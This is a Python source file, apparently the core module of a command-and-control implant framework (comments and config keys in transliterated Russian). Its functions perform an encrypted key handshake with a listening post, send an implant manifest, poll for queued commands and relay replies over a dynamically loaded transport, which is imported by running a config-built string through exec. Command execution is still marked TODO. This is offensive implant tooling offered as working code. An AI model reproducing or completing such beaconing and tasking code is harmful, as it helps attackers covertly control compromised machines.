# ядро - core
import ast

from lib import instructions
from lib import transmit
from lib.crypto import asymmetric


def init(frame, component):
    """
    Initialization frame received, sending self manifest

    :param frame: Initialization frame
    :param component:
    :return:
    """
    try:
        component.current_lp_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['lpk']))
        component.logging.log(f"Initialization complete", source="lib.yadro")
    except Exception as e:
        component.logging.log(f"Failed to get init. Encountered [{type(e).__name__}]: {e}",
                              level="critical", source="lib.yadro")
    return 0


def rekey(frame, component):
    """
    Rekey request received

    :param frame:
    :param component:
    :return:
    """
    # TODO: Key rotation
    component.current_private_key = component.initial_private_key
    component.current_public_key = component.initial_public_key
    data = init(frame, component)

    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(component, instruction_frame)
    return reply_frame


def getcmd(frame, component):
    # TODO: Key rotation
    component.current_lp_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['lpk']))
    component.current_private_key = component.initial_private_key
    component.current_public_key = component.initial_public_key

    if len(frame['args'][0]) == 0:
        # We got no commands, go to sleep
        return 0
    else:
        for command in frame['args'][0]:
            component.cmd_queue.append(command)
            # TODO: Execute the commands
    return None


def send_cmd_output(component):
    for command in component.cmd_done_queue:
        print("command")


def import_transport_for_implant(component, transport_config):
    transport_name = component.config['vzhivlyat']['transport_name']
    import_string = f"import transports.{transport_name} as transport"
    transport_config['logging'] = component.logging
    exec(import_string, globals())
    try:
        # I know this is fucking weird, but you find a better way to do this then
        implant_transport = transport.Transport()
        component.transport = implant_transport
        component.logging.log(f"Imported {transport_name}",
                              level="debug", source="lib.yadro")
        component.transport.prep_transport(transport_config)
        return component.transport
    except ImportError:
        component.logging.log(f"{transport_name} not found!, attempted import",
                              level="error", source="lib.yadro")


def generate_init_frame(component):
    data = {'component_id': component.component_id, "cmd": "ii", "args": [{"manifest": component.manifest}, {"ipk": component.initial_public_key._public_key}]}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_sealed_frame(component, instruction_frame)
    return reply_frame


def relay_reply(component, reply):
    try:
        reply_frame = transmit.cook_transmit_frame(component, reply)
        component.transport.send_data(reply_frame)
    except Exception as e:
        component.logging.log(f"Critical [{type(e).__name__}] when relaying: {e}",
                              level="critical", source=f"lib.yadro")


def retrieve_output(component):
    try:
        reply_frame = component.transport.recv_data()
        # TODO: Rotate implant private key here
        return reply_frame
    except Exception as e:
        component.logging.log(f"Critical [{type(e).__name__}] when retrieving data: {e}",
                              level="critical", source=f"lib.yadro")
        return None


def relay_init_frame(component, reply):
    try:
        component.transport.send_data(reply)
        init_response = component.transport.recv_data()
        uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, init_response).decode('utf-8'))
        return uncooked_frame
    except Exception as e:
        component.logging.log(f"Critical [{type(e).__name__}] when relaying init: {e}",
                              level="critical", source=f"lib.yadro")


def request_instructions(component):
    try:
        data = {'component_id': component.component_id, "cmd": "icmdr", "args": [{"ipk": component.current_public_key._public_key}]}
        instruction_frame = instructions.create_instruction_frame(data)
        request_frame = transmit.cook_transmit_frame(component, instruction_frame)
        component.transport.send_data(request_frame)
        reply = component.transport.recv_data()
        uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, reply).decode('utf-8'))
        return uncooked_frame
    except Exception as e:
        component.logging.log(f"Critical [{type(e).__name__}] when requesting instructions: {e}",
                              level="critical", source=f"lib.yadro")